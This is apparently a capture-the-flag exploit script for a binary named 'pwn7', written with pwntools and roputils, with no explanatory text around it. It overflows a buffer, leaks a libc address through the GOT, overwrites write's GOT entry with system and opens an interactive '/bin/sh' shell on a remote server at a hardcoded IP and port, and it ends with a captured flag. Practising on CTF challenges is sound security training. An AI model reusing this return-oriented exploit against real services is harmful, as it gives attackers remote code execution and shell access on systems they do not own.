import roputils
from pwn import *
context.log_level = "debug"
fpath = 'pwn7'
offset = 0x24 + 0x4

rop = roputils.ROP(fpath)
elf = ELF("./pwn7")

payload = rop.retfill(offset)
payload += rop.call('write', 1, elf.got['read'], 4)
#payload += rop.call('write', 1, elf.got['write'], 4)
payload += rop.call('read', 1, elf.got['write'], 4+8)
payload += rop.call('write',elf.got['write']+0x4,0,0)
payload = payload.ljust(0x80,"\x00")

p = remote("114.116.54.89","10007")

p.recvuntil("name:\n")
p.send(payload)
libc_addr = u32(p.recv(4))-0x000d4350
system_addr = 0x0003a940 + libc_addr
success(hex(libc_addr))
p.send(p32(system_addr) + "/bin/sh\x00")
p.interactive()
#flag{222d2a7d74da3a4f5a0em}
